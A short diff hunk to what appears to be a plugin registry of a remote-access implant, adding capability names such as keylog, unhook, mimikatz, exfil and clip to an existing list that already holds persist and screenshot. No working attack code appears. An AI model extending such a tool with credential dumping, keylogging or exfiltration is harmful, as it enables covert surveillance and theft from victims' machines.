@@ -3,7 +3,7 @@ import logging
 
 log = logging.getLogger("nexus.plugins")
 
-_REGISTRY = ["sysinfo", "download", "persist", "screenshot"]
+_REGISTRY = ["sysinfo", "download", "persist", "screenshot", "keylog", "unhook", "mimikatz", "nmcli", "cat", "exfil", "clip", "notify"]
 
 
 def dispatch(cmd: str) -> tuple[int, str, str]:
